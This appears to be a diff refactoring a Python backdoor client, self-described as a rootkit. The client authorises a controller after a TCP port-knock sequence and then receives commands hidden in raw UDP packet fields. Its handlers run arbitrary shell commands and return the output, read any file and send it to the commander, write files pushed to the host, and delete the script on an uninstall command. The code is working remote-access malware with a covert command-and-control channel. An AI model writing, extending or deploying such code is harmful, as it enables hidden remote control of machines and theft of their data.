@@ -15,157 +15,24 @@ import subprocess
 from enum import IntEnum
 from collections import deque
 import threading
+from raw_socket_protocol import RawSocketProtocol
 
 # Configuration
 KNOCK_SEQUENCE = [7000, 8000, 9000]  # TCP knock sequence
-KNOCK_TIMEOUT = 10  # Seconds to complete knock
-COMMAND_PORT = 8888  # UDP port for covert channel (after knocking)
-TMP_DIR = "client_files/"  # directory for files transferred from commander to client
+KNOCK_TIMEOUT  = 10                   # Seconds to complete knock sequence
+COMMAND_PORT   = 8888                 # UDP port for covert channel
+TMP_DIR        = "client_files/"     # Directory for files transferred from commander
 
 
 class CommandType(IntEnum):
-    """Commands encoded in UDP checksum field"""
-    DISCONNECT = 0x1234
-    UNINSTALL = 0x2345
-    TRANSFER_TO_CLIENT = 0x3456
+    """Commands encoded in UDP src-port field"""
+    DISCONNECT           = 0x1234
+    UNINSTALL            = 0x2345
+    TRANSFER_TO_CLIENT   = 0x3456
     TRANSFER_FROM_CLIENT = 0x4567
-    RUN_COMMAND = 0x5678
-    ACK = 0x9ABC
-    ERROR = 0xABCD
-
-
-class RawSocketProtocol:
-    """Raw socket protocol for covert communication"""
-
-    def __init__(self):
-        self.sequence = 0
-
-    def calculate_checksum(self, data):
-        """Calculate checksum"""
-        if len(data) % 2 != 0:
-            data += b'\x00'
-
-        checksum = 0
-        for i in range(0, len(data), 2):
-            word = (data[i] << 8) + data[i + 1]
-            checksum += word
-
-        checksum = (checksum >> 16) + (checksum & 0xFFFF)
-        checksum += checksum >> 16
-
-        return ~checksum & 0xFFFF
-
-    def create_ip_header(self, src_ip, dst_ip, total_length):
-        """Create IP header"""
-        ip_version = 4
-        ip_ihl = 5
-        ip_tos = 0
-        ip_tot_len = total_length
-        ip_id = self.sequence & 0xFFFF
-        ip_frag_off = 0
-        ip_ttl = 64
-        ip_proto = socket.IPPROTO_UDP
-        ip_check = 0
-        ip_saddr = socket.inet_aton(src_ip)
-        ip_daddr = socket.inet_aton(dst_ip)
-
-        ip_ihl_version = (ip_version << 4) + ip_ihl
-
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-                                ip_ihl_version, ip_tos, ip_tot_len,
-                                ip_id, ip_frag_off, ip_ttl, ip_proto,
-                                ip_check, ip_saddr, ip_daddr)
-
-        ip_check = self.calculate_checksum(ip_header)
-
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-                                ip_ihl_version, ip_tos, ip_tot_len,
-                                ip_id, ip_frag_off, ip_ttl, ip_proto,
-                                ip_check, ip_saddr, ip_daddr)
-
-        return ip_header
-
-    def create_udp_packet(self, src_ip, dst_ip, src_port, dst_port,
-                          payload, command_type):
-        """Create UDP packet with command in checksum"""
-        udp_length = 8 + len(payload)
-        udp_checksum = int(command_type)  # COVERT CHANNEL
-
-        udp_header = struct.pack('!HHHH',
-                                 src_port, dst_port,
-                                 udp_length, udp_checksum)
-
-        total_length = 20 + len(udp_header) + len(payload)
-        ip_header = self.create_ip_header(src_ip, dst_ip, total_length)
-
-        packet = ip_header + udp_header + payload
-        return packet
-
-    def send_packet(self, src_ip, dst_ip, src_port, dst_port,
-                    command_type, payload=b''):
-        """Send covert packet"""
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
-
-            self.sequence += 1
-            actual_src_port = self.sequence & 0xFFFF
-
-            packet = self.create_udp_packet(
-                src_ip, dst_ip,
-                actual_src_port, dst_port,
-                payload, command_type
-            )
-
-            sock.sendto(packet, (dst_ip, 0))
-            sock.close()
-            return True
-
-        except PermissionError:
-            print("[!] Raw sockets require root privileges")
-            return False
-        except Exception as e:
-            print(f"[!] Error sending: {e}")
-            return False
-
-    def parse_udp_packet(self, packet):
-        """Parse UDP packet and extract covert data"""
-        if len(packet) < 20:
-            return None
-
-        ip_header = packet[:20]
-        iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
-
-        version_ihl = iph[0]
-        ihl = version_ihl & 0xF
-        iph_length = ihl * 4
-
-        protocol = iph[6]
-        src_ip = socket.inet_ntoa(iph[8])
-        dst_ip = socket.inet_ntoa(iph[9])
-
-        if protocol != 17:  # Not UDP
-            return None
-
-        udp_header = packet[iph_length:iph_length + 8]
-        if len(udp_header) < 8:
-            return None
-
-        udph = struct.unpack('!HHHH', udp_header)
-        src_port = udph[0]
-        dst_port = udph[1]
-        udp_length = udph[2]
-        udp_checksum = udph[3]  # COVERT DATA HERE!
-
-        payload = packet[iph_length + 8:]
-
-        return {
-            'src_ip': src_ip,
-            'dst_ip': dst_ip,
-            'src_port': src_port,
-            'dst_port': dst_port,
-            'checksum': udp_checksum,
-            'payload': payload
-        }
+    RUN_COMMAND          = 0x5678
+    ACK                  = 0x9ABC
+    ERROR                = 0xABCD
 
 
 class Client:
@@ -176,18 +43,22 @@ class Client:
     """
 
     def __init__(self):
-        self.knock_ports = KNOCK_SEQUENCE
-        self.command_port = COMMAND_PORT
-        self.knock_sequence = KNOCK_SEQUENCE
-        self.knock_timeout = KNOCK_TIMEOUT
-        self.knock_attempts = {}
-        self.authorized_ips = set()
-        self.lock = threading.Lock()
-        self.running = True
-        self.protocol = RawSocketProtocol()
+        self.knock_ports     = KNOCK_SEQUENCE
+        self.command_port    = COMMAND_PORT
+        self.knock_sequence  = KNOCK_SEQUENCE
+        self.knock_timeout   = KNOCK_TIMEOUT
+        self.knock_attempts  = {}
+        self.authorized_ips  = set()
+        self.lock            = threading.Lock()
+        self.running         = True
+        self.protocol        = RawSocketProtocol()
+
+    # ------------------------------------------------------------------ #
+    #  Port-knock helpers                                                  #
+    # ------------------------------------------------------------------ #
 
     def record_knock(self, ip_address, port):
-        """Record knock attempt and check sequence"""
+        """Record a knock attempt and check whether the full sequence is complete."""
         current_time = time.time()
 
         with self.lock:
@@ -199,12 +70,14 @@ class Client:
 
             knock_data = self.knock_attempts[ip_address]
 
+            # Reset if the sequence timed out
             if current_time - knock_data['last_knock'] > self.knock_timeout:
                 knock_data['knocks'].clear()
 
             knock_data['knocks'].append(port)
             knock_data['last_knock'] = current_time
 
+            # Keep only the last N knocks
             while len(knock_data['knocks']) > len(self.knock_sequence):
                 knock_data['knocks'].popleft()
 
@@ -220,19 +93,17 @@ class Client:
         return False
 
     def is_authorized(self, ip_address):
-        """Check if IP is authorized"""
         with self.lock:
             return ip_address in self.authorized_ips
 
     def revoke_authorization(self, ip_address):
-        """Remove authorization"""
         with self.lock:
             if ip_address in self.authorized_ips:
                 self.authorized_ips.remove(ip_address)
                 print(f"[*] Revoked authorization for {ip_address}")
 
     def listen_for_knocks(self, port):
-        """Listen for TCP port knocks"""
+        """Thread target: listen for TCP knocks on a single port."""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.settimeout(1.0)
@@ -259,60 +130,124 @@ class Client:
         finally:
             sock.close()
 
+    # ------------------------------------------------------------------ #
+    #  Covert channel listener                                            #
+    # ------------------------------------------------------------------ #
+
+    def _reset_transfer_state(self):
+        """Return a clean slate for a new inbound transfer."""
+        return {
+            'chunks':        {},
+            'expected_total': None,
+            'current_command': None,
+            'current_src_ip':  None,
+        }
+
     def listen_for_covert_commands(self):
-        """Listen for covert channel commands via raw UDP socket"""
+        """Listen for covert channel commands via raw UDP socket."""
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            sock.bind(('', self.command_port))
 
             print(f"[*] Covert channel listener on UDP port {self.command_port}")
-            print(f"[*] Commands will be extracted from UDP checksum field")
+            print("[*] Waiting for covert packets...")
             print()
+
+            state = self._reset_transfer_state()
 
             while self.running:
                 try:
                     packet, addr = sock.recvfrom(65535)
-
                     parsed = self.protocol.parse_udp_packet(packet)
                     if not parsed:
                         continue
 
-                    if parsed['dst_port'] != self.command_port:
+                    if parsed["dst_port"] != self.command_port:
                         continue
 
-                    src_ip = parsed['src_ip']
+                    src_ip = addr[0]
 
-                    # CHECK AUTHORIZATION from port knocking
                     if not self.is_authorized(src_ip):
-                        print(f"[!] Unauthorized covert command from {src_ip} (no valid knock)")
+                        print(f"[!] Unauthorized covert packet from {src_ip} — ignoring")
                         continue
 
-                    # Extract command from checksum field
-                    command_code = parsed['checksum']
+                    seq          = parsed["seq"]
+                    data         = parsed["data"]
+                    total        = parsed["total"]
+                    command_code = parsed["command"]
 
-                    try:
-                        command_type = CommandType(command_code)
-                    except ValueError:
-                        print(f"[!] Unknown command: 0x{command_code:04X}")
-                        continue
+                    # ── Reset if a new sender interrupts an in-progress transfer ──
+                    if state['current_src_ip'] is not None and src_ip != state['current_src_ip']:
+                        print(f"[!] Source IP changed mid-transfer "
+                              f"({state['current_src_ip']} → {src_ip}) — resetting state")
+                        state = self._reset_transfer_state()
 
-                    print(f"\n[+] Covert command from {src_ip} (AUTHORIZED)")
-                    print(f"    Sequence: {parsed['src_port']}")
-                    print(f"    Command: {command_type.name} (0x{command_code:04X})")
-                    print(f"    Payload: {parsed['payload'][:50]}")
+                    # ── Initialise state on first packet of a new command ─────────
+                    if state['expected_total'] is None:
+                        state['expected_total']   = total
+                        state['current_command']  = command_code
+                        state['current_src_ip']   = src_ip
+                        state['chunks']           = {}
+                        print(f"\n[+] Receiving covert command from {src_ip}")
+                        print(f"    Expected packets: {total}")
 
-                    # Process command
-                    self.process_command(command_type, parsed['payload'], src_ip)
+                    print(f"[DEBUG] seq={seq}/{state['expected_total']} "
+                          f"cmd=0x{command_code:04X}")
 
-                    # Disconnect revokes authorization
-                    if command_type == CommandType.DISCONNECT:
-                        self.revoke_authorization(src_ip)
+                    state['chunks'][seq] = data
+
+                    # Progress for large transfers
+                    received = len(state['chunks'])
+                    if received % 50 == 0 and received > 0:
+                        print(f"    Received {received}/{state['expected_total']}")
+
+                    # ── All chunks received? ──────────────────────────────────────
+                    if state['expected_total'] and received >= state['expected_total']:
+
+                        # Check for sequence gaps before reassembling
+                        expected_seqs = set(range(1, state['expected_total'] + 1))
+                        received_seqs = set(state['chunks'].keys())
+                        if expected_seqs != received_seqs:
+                            missing = expected_seqs - received_seqs
+                            print(f"[!] Missing sequences {missing} — dropping command")
+                            state = self._reset_transfer_state()
+                            continue
+
+                        # Reassemble payload
+                        raw = b''.join(
+                            state['chunks'][i] for i in sorted(state['chunks'])
+                        )
+                        # Trim the single padding byte added for odd-length data
+                        if (state['expected_total'] * 2) > len(raw):
+                            payload = raw[:-1]
+                        else:
+                            payload = raw
+
+                        try:
+                            command_type = CommandType(state['current_command'])
+                        except ValueError:
+                            print(f"[!] Unknown command code: 0x{state['current_command']:04X}")
+                            state = self._reset_transfer_state()
+                            continue
+
+                        print(f"\n[+] Covert command received from {state['current_src_ip']}")
+                        print(f"    Command:      {command_type.name}")
+                        print(f"    Payload size: {len(payload)} bytes")
+
+                        src = state['current_src_ip']
+
+                        # Reset BEFORE processing so re-entrant packets aren't confused
+                        state = self._reset_transfer_state()
+
+                        self.process_command(command_type, payload, src)
+
+                        if command_type == CommandType.DISCONNECT:
+                            self.revoke_authorization(src)
 
                 except KeyboardInterrupt:
                     break
                 except Exception as e:
-                    print(f"[!] Error: {e}")
+                    print(f"[!] Error receiving covert packet: {e}")
                     continue
 
             sock.close()
@@ -325,66 +260,63 @@ class Client:
             print(f"[!] Fatal error: {e}")
             sys.exit(1)
 
+    # ------------------------------------------------------------------ #
+    #  Command handlers                                                    #
+    # ------------------------------------------------------------------ #
+
     def process_command(self, command_type, payload, src_ip):
-        """Process received command"""
+        """Dispatch and handle a fully-reassembled command."""
 
         if command_type == CommandType.DISCONNECT:
             print("[*] Processing DISCONNECT")
             print(f"    Closing session with {src_ip}")
+            # Authorization is revoked by the caller after this returns
 
         elif command_type == CommandType.UNINSTALL:
             print("[*] Processing UNINSTALL")
-            print("    Initiating uninstall sequence...")
-            os.remove(sys.argv[0])
-            uninstall_msg = "Rootkit uninstalled from client"
-            self.send_response(src_ip, CommandType.ACK, uninstall_msg.encode('utf-8'))
+            print("    Sending ACK then uninstalling...")
+            # Send ACK BEFORE deleting the script so the response goes out
+            self.send_response(src_ip, CommandType.ACK,
+                               b"Rootkit uninstalled from client")
+            time.sleep(0.5)  # allow send_response to complete
+            try:
+                os.remove(sys.argv[0])
+                print("    Script removed.")
+            except Exception as e:
+                print(f"    Could not remove script: {e}")
+            self.running = False  # shut down the client
 
         elif command_type == CommandType.TRANSFER_TO_CLIENT:
             print("[*] Processing TRANSFER_TO_CLIENT")
-            # Payload format: filename|filedata
             try:
-                if len(payload) < 2:
-                    print("    Error: Invalid payload format")
-                    return
-
-                # Extract filename length (first 2 bytes)
                 filename_length = struct.unpack('!H', payload[:2])[0]
+                filename        = payload[2:2 + filename_length].decode('utf-8')
+                filedata        = payload[2 + filename_length:]
 
-                # Extract filename
-                filename = payload[2:2 + filename_length].decode('utf-8')
+                print(f"    Receiving file: {filename} ({len(filedata)} bytes)")
 
-                # Extract file data (remaining bytes)
-                filedata = payload[2 + filename_length:]
-
-                print(f"    Receiving file: {filename}")
-                print(f"    Size: {len(filedata)} bytes")
-
-                # Write file to /tmp as raw bytes
                 filepath = os.path.join(os.getcwd(), TMP_DIR, filename)
-                print(filepath)
                 with open(filepath, 'wb') as f:
                     f.write(filedata)
                 print(f"    File saved to: {filepath}")
 
             except Exception as e:
-                print(f"    Error: {e}")
+                print(f"    Error saving file: {e}")
 
         elif command_type == CommandType.TRANSFER_FROM_CLIENT:
-            filepath = payload.decode('utf-8', errors='ignore')
+            filepath = payload.decode('utf-8', errors='ignore').strip()
             print(f"[*] Processing TRANSFER_FROM_CLIENT: {filepath}")
             try:
                 with open(filepath, 'rb') as f:
                     content = f.read()
-                print(f"    File size: {len(content)} bytes")
-                # Send file back to commander
+                print(f"    Sending {len(content)} bytes to commander")
                 self.send_response(src_ip, CommandType.ACK, content)
             except Exception as e:
                 print(f"    Error: {e}")
-                error_msg = str(e).encode('utf-8')
-                self.send_response(src_ip, CommandType.ERROR, error_msg)
+                self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
         elif command_type == CommandType.RUN_COMMAND:
-            cmd = payload.decode('utf-8', errors='ignore')
+            cmd = payload.decode('utf-8', errors='ignore').strip()
             print(f"[*] Processing RUN_COMMAND: {cmd}")
             try:
                 result = subprocess.run(
@@ -392,23 +324,26 @@ class Client:
                     capture_output=True, text=True,
                     timeout=30
                 )
-                # Send stdout back to commander
-                output = result.stdout if result.stdout else ""
-                print(f"    Sending output ({len(output)} bytes) to commander")
+                output = result.stdout or ""
+                stderr = result.stderr or ""
+                if stderr:
+                    print(f"    stderr: {stderr.strip()}")
+                print(f"    Output ({len(output)} bytes): {output.strip()}")
                 self.send_response(src_ip, CommandType.ACK, output.encode('utf-8'))
             except Exception as e:
                 print(f"    Error: {e}")
-                error_msg = str(e).encode('utf-8')
-                self.send_response(src_ip, CommandType.ERROR, error_msg)
+                self.send_response(src_ip, CommandType.ERROR, str(e).encode())
+
+    # ------------------------------------------------------------------ #
+    #  Response sender                                                     #
+    # ------------------------------------------------------------------ #
 
     def send_response(self, dst_ip, command_type, payload):
-        """Send response back to commander via covert channel"""
+        """Send a response back to the commander via the covert channel."""
         try:
-            # Use the raw socket protocol to send response
             self.protocol.send_packet(
                 self.get_local_ip(),
                 dst_ip,
-                0,  # Source port (sequence)
                 self.command_port,
                 command_type,
                 payload
@@ -418,38 +353,37 @@ class Client:
             print(f"    Failed to send response: {e}")
 
     def get_local_ip(self):
-        """Get local IP address"""
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             s.connect(("8.8.8.8", 80))
             local_ip = s.getsockname()[0]
             s.close()
             return local_ip
-        except:
+        except Exception:
             return "127.0.0.1"
 
+    # ------------------------------------------------------------------ #
+    #  Entry point                                                         #
+    # ------------------------------------------------------------------ #
+
     def start(self):
-        """Start the client"""
         print("=" * 60)
         print("Client - Port Knock + Raw Socket Covert Channel")
         print("=" * 60)
         print(f"Knock sequence: {self.knock_sequence}")
-        print(f"Knock timeout: {self.knock_timeout}s")
-        print(f"Command port: UDP {self.command_port}")
+        print(f"Knock timeout:  {self.knock_timeout}s")
+        print(f"Command port:   UDP {self.command_port}")
         print("=" * 60)
         print()
 
-        if not os.path.exists(os.path.join(os.getcwd(),TMP_DIR)):
-            print("temp directory created \n")
-            os.makedirs(os.getcwd() + TMP_DIR)
+        os.makedirs(os.path.join(os.getcwd(), TMP_DIR), exist_ok=True)
 
-        # Start knock listeners
+        # Start a knock-listener thread for each port
         for port in self.knock_ports:
-            thread = threading.Thread(target=self.listen_for_knocks, args=(port,))
-            thread.daemon = True
-            thread.start()
+            t = threading.Thread(target=self.listen_for_knocks, args=(port,), daemon=True)
+            t.start()
 
-        # Start covert channel listener (main thread)
+        # Covert channel listener runs on the main thread
         try:
             self.listen_for_covert_commands()
         except KeyboardInterrupt:
@@ -461,7 +395,6 @@ def main():
     print("Client Program")
     print("Requires root/admin privileges for raw sockets")
     print()
-
     client = Client()
     client.start()
 
